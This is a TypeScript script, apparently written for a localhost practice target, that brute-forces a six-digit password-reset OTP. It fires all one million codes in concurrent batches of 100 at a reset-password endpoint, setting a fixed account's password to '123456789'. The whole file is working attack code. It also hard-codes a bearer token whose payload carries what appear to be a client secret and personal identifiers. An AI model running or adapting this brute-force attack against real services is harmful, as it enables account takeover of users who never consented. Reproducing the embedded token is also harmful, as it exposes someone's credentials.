import axios from "axios";

async function sendRequest(otp: string) {
    let data = JSON.stringify({
      "email": "dh118@gmail.com",
      "otp": otp,
      "newPassword": "123456789"
    });
    
    let config = {
      method: 'post',
      maxBodyLength: Infinity,
      url: 'http://localhost:3000/reset-password',
      headers: { 
        'Content-Type': 'application/json', 
        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJNYXBDbGFpbXMiOnsiZXhwIjoxNzE3MjI1MDkzLCJpYXQiOjE3MTcyMjQ3OTMsImlzcyI6IkFmZm9yZG1lZCIsImp0aSI6ImE2ZjE5ZDFjLTEzNTUtNDE5Yi05Yzk2LWU0Mjg3Zjc3MTU0ZSIsInN1YiI6IjIxaXQzMDMyQHJnaXB0LmFjLmluIn0sImNvbXBhbnlOYW1lIjoiZ29NYXJ0IiwiY2xpZW50SUQiOiJhNmYxOWQxYy0xMzU1LTQxOWItOWM5Ni1lNDI4N2Y3NzE1NGUiLCJjbGllbnRTZWNyZXQiOiJIZHRUa09aSUtZSHFrTWR2Iiwib3duZXJOYW1lIjoiRGhhaXJ5YSIsIm93bmVyRW1haWwiOiIyMWl0MzAzMkByZ2lwdC5hYy5pbiIsInJvbGxObyI6IjIxaXQzMDMyIn0.u10X8UUEhaPGWN2aF7ZgHAr3LsttebNVuwQAw726i_Y'
      },
      data : data
    };
    
   try {
    await axios.request(config)
    console.log("done for " + otp);
   } catch (error) {
    
   }
    
}

async function main() {
  for (let i = 0; i < 1000000; i += 100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest((i + j).toString()));
    }
    await Promise.all(promises);
  }
}

main();
